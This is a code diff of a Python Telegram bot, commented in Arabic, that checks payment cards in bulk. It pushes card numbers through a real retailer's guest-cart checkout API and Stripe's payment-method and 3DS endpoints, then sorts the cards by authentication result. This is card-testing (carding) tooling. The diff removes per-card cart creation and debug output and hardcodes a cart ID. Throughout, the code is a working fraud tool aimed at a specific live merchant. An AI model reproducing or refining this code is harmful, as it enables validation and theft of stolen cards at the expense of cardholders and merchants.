@@ -45,130 +45,8 @@ class StripeChecker:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         }
         
-    def create_new_cart(self):
-        """إنشاء سلة جديدة والحصول على quoteId"""
-        try:
-            print("[*] Creating new cart...")
-            
-            # إنشاء session جديدة لكل cart
-            import time
-            import random
-            
-            # الحصول على الصفحة الرئيسية أولاً للحصول على cookies
-            home_response = self.session.get('https://www.ironmongeryworld.com/')
-            
-            # إضافة المنتج للسلة
-            data = {
-                'product': '16484',
-                'selected_configurable_option': '',
-                'related_product': '',
-                'item': '16484',
-                'form_key': 'slSdPjvgeIrs2Jbv',
-                'qty': '1'
-            }
-            
-            headers = {
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://www.ironmongeryworld.com',
-                'referer': 'https://www.ironmongeryworld.com/air-bricks-vents-trivets/round-circle-hit-miss-sliding-vent-antique-iron.html',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-            }
-            
-            add_response = self.session.post(
-                'https://www.ironmongeryworld.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuaXJvbm1vbmdlcnl3b3JsZC5jb20vYWlyLWJyaWNrcy12ZW50cy10cml2ZXRzL3JvdW5kLWNpcmNsZS1oaXQtbWlzcy1zbGlkaW5nLXZlbnQtYW50aXF1ZS1pcm9uLmh0bWw%2C/product/16484/',
-                data=data,
-                headers=headers,
-                allow_redirects=True
-            )
-            
-            print(f"[*] Add to cart status: {add_response.status_code}")
-            
-            # انتظار قصير
-            time.sleep(0.5)
-            
-            # الحصول على معلومات السلة
-            params = {
-                'sections': 'cart',
-                'force_new_section_timestamp': 'true',
-                '_': str(int(time.time() * 1000)),
-            }
-            
-            cart_headers = {
-                'accept': 'application/json, text/javascript, */*; q=0.01',
-                'accept-language': 'en-US,en;q=0.9',
-                'referer': 'https://www.ironmongeryworld.com/checkout/cart/',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'x-requested-with': 'XMLHttpRequest',
-            }
-
-            cart_response = self.session.get(
-                'https://www.ironmongeryworld.com/customer/section/load/',
-                params=params,
-                headers=cart_headers
-            )
-
-            cart_data = cart_response.json()
-            
-            print(f"[*] Cart items count: {cart_data.get('cart', {}).get('summary_count', 0)}")
-            
-            if 'cart' in cart_data and 'mpquickcart' in cart_data['cart']:
-                quote_id = cart_data['cart']['mpquickcart'].get('quoteId')
-                
-                if quote_id:
-                    print(f"[✓] New cart created with quoteId: {quote_id}")
-                    return quote_id
-                else:
-                    # إذا لم يكن هناك quoteId، جرب استخراجه من API مباشرة
-                    print("[*] Trying to create guest cart via API...")
-                    api_response = self.session.post(
-                        'https://www.ironmongeryworld.com/rest/default/V1/guest-carts',
-                        headers={'Content-Type': 'application/json'}
-                    )
-                    if api_response.status_code == 200:
-                        new_quote_id = api_response.json()
-                        print(f"[✓] Created guest cart via API: {new_quote_id}")
-                        
-                        # إضافة المنتج للسلة الجديدة
-                        item_payload = {
-                            'cartItem': {
-                                'sku': 'TempRCHM',
-                                'qty': 1,
-                                'quote_id': new_quote_id
-                            }
-                        }
-                        self.session.post(
-                            f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{new_quote_id}/items',
-                            json=item_payload,
-                            headers={'Content-Type': 'application/json'}
-                        )
-                        return new_quote_id
-                    else:
-                        print(f"[!] API cart creation failed: {api_response.status_code}")
-                        return None
-            else:
-                print(f"[!] Cart data structure unexpected")
-                return None
-                
-        except Exception as e:
-            print(f"[!] Error creating cart: {e}")
-            import traceback
-            traceback.print_exc()
-            return None
-        
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
-            print(f"\n[*] Checking card: {card_number[:6]}****{card_number[-4:]}")
-            
-            # إنشاء سلة جديدة والحصول على quoteId
-            quote_id = self.create_new_cart()
-            if not quote_id:
-                print("[!] Failed to create cart - returning error")
-                return 'ERROR', 'Failed to create new cart'
-            
-            print(f"[*] Using quoteId: {quote_id}")
-            
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
@@ -180,13 +58,9 @@ class StripeChecker:
             
             r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm = r.json()
-            print(f"[*] Payment method response: {pm}")
             if 'id' not in pm:
-                error_msg = pm.get('error', {}).get('message', 'Unknown error')
-                print(f"[!] Payment method creation failed: {error_msg}")
-                return 'DECLINED', f'Payment method failed: {error_msg}'
+                return 'DECLINED', 'Payment method creation failed'
             pm_id = pm['id']
-            print(f"[✓] Payment method created: {pm_id}")
             
             headers = self.headers.copy()
             headers.update({
@@ -196,7 +70,7 @@ class StripeChecker:
             })
             
             payload = {
-                'cartId': quote_id,  # استخدام الـ quoteId الجديد
+                'cartId': 'Po9ukXigB3Dus69b8SJERtt2J6UpCXMp',
                 'billingAddress': {
                     'countryId': 'US',
                     'regionId': '13',
@@ -214,18 +88,12 @@ class StripeChecker:
                 'email': 'test@test.com',
             }
             
-            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{quote_id}/payment-information', headers=headers, json=payload)
-            print(f"[*] Payment info response status: {r.status_code}")
-            print(f"[*] Payment info response: {r.text[:500]}")
-            
+            r = self.session.post('https://www.ironmongeryworld.com/rest/default/V1/guest-carts/Po9ukXigB3Dus69b8SJERtt2J6UpCXMp/payment-information', headers=headers, json=payload)
             res = r.json()
             if 'message' not in res or 'pi_' not in res['message']:
-                error_msg = res.get('message', 'Unknown error')
-                print(f"[!] Payment intent creation failed: {error_msg}")
-                return 'DECLINED', f'Payment intent failed: {error_msg}'
+                return 'DECLINED', 'Payment intent creation failed'
             client_secret = res['message'].split(': ')[1]
             pi_id = client_secret.split('_secret_')[0]
-            print(f"[✓] Payment intent created: {pi_id}")
             
             headers = self.headers.copy()
             headers.update({
@@ -270,26 +138,19 @@ class StripeChecker:
             
             r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
             auth = r.json()
-            print(f"[*] 3DS Auth response: {auth}")
-            
-            if 'error' in auth:
-                print(f"[!] 3DS Authentication error: {auth['error']}")
-                return 'ERROR', f"3DS Error: {auth['error'].get('message', 'Unknown')}"
             
             if 'ares' in auth:
                 status = auth['ares'].get('transStatus', 'UNKNOWN')
-                print(f"[*] 3DS Transaction Status: {status}")
-                
                 if status == 'R':
-                    reason = auth['ares'].get('transStatusReason', 'Rejected by issuer')
-                    print(f"[!] Rejected - Reason: {reason}")
-                    return 'DECLINED', f'Rejected: {reason}'
+                    return 'DECLINED', 'Rejected by issuer'
                 
+                # إذا كانت الحالة C، نفحص الـ Challenge
                 if status == 'C' and 'creq' in auth and 'ares' in auth and 'acsURL' in auth['ares']:
                     try:
                         creq = auth['creq']
                         acs_url = auth['ares']['acsURL']
                         
+                        # إعداد headers مع cookies للطلب
                         challenge_headers = {
                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                             'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -311,6 +172,7 @@ class StripeChecker:
                         
                         challenge_data = {'creq': creq}
                         
+                        # إرسال الطلب
                         challenge_response = self.session.post(
                             acs_url,
                             headers=challenge_headers,
@@ -319,8 +181,10 @@ class StripeChecker:
                             allow_redirects=True
                         )
                         
+                        # فحص الرد
                         html_response = challenge_response.text
                         
+                        # فحص جميع حالات الفشل
                         failure_keywords = [
                             'Authentication failed',
                             'authentication failed',
@@ -334,18 +198,14 @@ class StripeChecker:
                             return 'FAILED_AUTH', 'Authentication failed in challenge'
                         
                     except Exception as e:
+                        # لو حصل خطأ في الفحص، نكمل عادي ونعتبرها C
                         pass
                 
                 return status, f'3DS Status: {status}'
-            
-            print(f"[!] Unexpected auth response structure")
-            return 'DECLINED', f'Auth failed: {str(auth)[:100]}'
+            return 'DECLINED', 'Authentication failed'
             
         except Exception as e:
-            print(f"[!] Exception in check: {str(e)}")
-            import traceback
-            traceback.print_exc()
-            return 'ERROR', f'Exception: {str(e)}'
+            return 'ERROR', str(e)
 
 async def send_result(bot_app, card, status_type, message):
     try:
@@ -401,12 +261,7 @@ async def send_result(bot_app, card, status_type, message):
         print(f"[!] Error: {e}")
 
 async def check_card(card, bot_app):
-    print(f"\n{'='*50}")
-    print(f"[>>] Starting check_card for: {card}")
-    print(f"{'='*50}")
-    
     if not stats['is_running']:
-        print("[!] Check stopped - is_running = False")
         return card, "STOPPED", "تم الإيقاف"
     
     parts = card.strip().split('|')
@@ -616,8 +471,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "❌ N - Not Authenticated\n"
         "🔴 U - Unavailable\n"
         "❌ Declined/Rejected (R)\n"
-        "❌ Failed Auth - فشل المصادقة\n\n"
-        "🆕 **السلة تتجدد تلقائياً لكل بطاقة!**",
+        "❌ Failed Auth - فشل المصادقة",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -668,8 +522,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"✅ تم بدء الفحص!\n\n"
         f"📊 إجمالي البطاقات: {len(cards)}\n"
-        f"🔄 جاري الفحص...\n"
-        f"🆕 السلة تتجدد تلقائياً لكل بطاقة!",
+        f"🔄 جاري الفحص...",
         parse_mode='Markdown'
     )
     
@@ -702,9 +555,9 @@ async def process_cards(cards, bot_app):
     await update_dashboard(bot_app)
     
     summary_text = (
-        "┌──────────────────┐\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
         "✅ **اكتمل الفحص!** ✅\n"
-        "└──────────────────┘\n\n"
+        "━━━━━━━━━━━━━━━━━━━\n\n"
         f"📊 **الإحصائيات النهائية:**\n"
         f"🔥 الإجمالي: {stats['total']}\n"
         f"✅ Authenticated (Y): {stats['authenticated']}\n"
@@ -732,8 +585,7 @@ async def process_cards(cards, bot_app):
         "╚═══════════════════╝\n\n"
         "✅ تم إرسال جميع الملفات\n"
         "📊 شكراً لاستخدامك البوت!\n\n"
-        "⚡️ Stripe 3DS Gateway\n"
-        "🆕 Dynamic Cart System"
+        "⚡️ Stripe 3DS Gateway"
     )
     
     await bot_app.bot.send_message(
@@ -779,7 +631,6 @@ def main():
     print("[✅] Bot will send results in chat (no channel)")
     print("[✅] Using asyncio.create_task (no threading)")
     print("[✅] Failed Authentication detection enabled")
-    print("[🆕] Dynamic Cart System - New cart for each check!")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
